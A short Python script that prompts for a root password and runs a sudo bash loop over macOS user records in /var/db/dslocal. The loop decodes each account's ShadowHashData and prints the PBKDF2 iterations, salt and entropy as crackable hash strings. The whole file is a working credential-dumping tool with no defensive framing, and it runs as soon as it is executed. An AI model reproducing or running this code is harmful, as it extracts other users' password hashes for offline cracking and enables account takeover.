import os
import subprocess
from getpass import getpass

def extract_mac_password_hash():
    # Prompt user for root password
    root_password = getpass("Enter your root password: ")

    # Define the bash command
    bash_command = """
    sudo -S bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do 
      plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}";
      for j in {iterations,salt,entropy}; do 
        l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -);
        if [[ $j == iterations ]]; then echo -n $l; 
        else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}";
        fi;
      done;
      echo "";
    done'
    """

    try:
        # Run the bash command with the root password
        result = subprocess.run(bash_command, shell=True, input=root_password + '\n', encoding='utf-8', capture_output=True, text=True)

        # Check and print output
        if result.returncode == 0:
            print("Hash extraction successful. Output:")
            print(result.stdout)
        else:
            print("Error:", result.stderr)

    except Exception as e:
        print("An error occurred:", e)

# Execute the function
extract_mac_password_hash()
